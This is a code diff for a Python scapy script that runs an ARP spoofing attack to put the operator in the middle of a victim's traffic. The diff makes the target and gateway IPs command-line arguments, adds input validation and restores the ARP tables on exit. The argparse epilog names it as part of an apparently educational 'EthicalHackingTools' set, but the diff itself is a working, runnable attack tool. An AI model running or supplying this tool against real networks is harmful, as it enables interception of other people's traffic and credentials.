@@ -2,6 +2,8 @@
 
 import scapy.all as scapy
 import time
+import argparse
+import re
 import sys
 
 # To enable IP forwarding for becoming MiM: echo 1 > /proc/sys/net/ipv4/ip_forward
@@ -37,14 +39,48 @@ def restore(destination_ip, source_ip):
     scapy.send(packet, count=4, verbose=False)
 
 
-TARGET_IP = "192.168.64.135"
-GATEWAY_IP = "192.168.64.2"
+# TARGET_IP = "192.168.64.135"
+# GATEWAY_IP = "192.168.64.2"
+
+
+def get_arguments():
+    parser = argparse.ArgumentParser(
+        prog='arp_spoof',
+        description='Starts an ARP spoofing attack, allowing the attacker to become Man-In-The-Middle.',
+        epilog='Part of EthicalHackingTools.'
+    )
+    parser.add_argument(dest="target", help="Target IP")
+    parser.add_argument(dest="gateway", help="Gateway IP")
+    options = parser.parse_args()
+
+    if not options.target:
+        parser.error("[-] Please specify a target IP address, use --help for more info.")
+    elif not re.match(r"^\d+\.\d+\.\d+\.\d+(/\d{1,2})?$", str(options.target)):
+        parser.error("[-] Please specify a valid target IP address, use --help for more info.")
+
+    if not options.gateway:
+        parser.error("[-] Please specify a gateway IP address, you can find it using 'ifconfig', "
+                     "or use --help for more info.")
+    elif not re.match(r"^\d+\.\d+\.\d+\.\d+(/\d{1,2})?$", str(options.gateway)):
+        parser.error("[-] Please specify a valid gateway IP address, use --help for more info.")
+
+    return options
+
 
 sent_packets_count = 0
+arguments = get_arguments()
 try:
     while True:
-        spoof(TARGET_IP, GATEWAY_IP)        # tells router I am the target
-        spoof(GATEWAY_IP, TARGET_IP)        # tells target that I am the router (gateway)
+        try:
+            spoof(arguments.target, arguments.gateway)        # tells router I am the target
+        except IndexError:
+            print("[-] Target IP address was not found on this network")
+            sys.exit(-1)
+        try:
+            spoof(arguments.gateway, arguments.target)        # tells target that I am the router (gateway)
+        except IndexError:
+            print("[-] Gateway IP address was not found on this network")
+            sys.exit(-1)
         sent_packets_count = sent_packets_count + 2
 
         # comma used to print everything on the same line, \r always prints from start of line,
@@ -58,6 +94,6 @@ try:
         time.sleep(2)
 except KeyboardInterrupt:
     print("\n[+] Resetting ARP tables...")
-    restore(TARGET_IP, GATEWAY_IP)
-    restore(GATEWAY_IP, TARGET_IP)
+    restore(arguments.target, arguments.gateway)
+    restore(arguments.gateway, arguments.target)
     print("[+] Successfully restored. Quitting...")
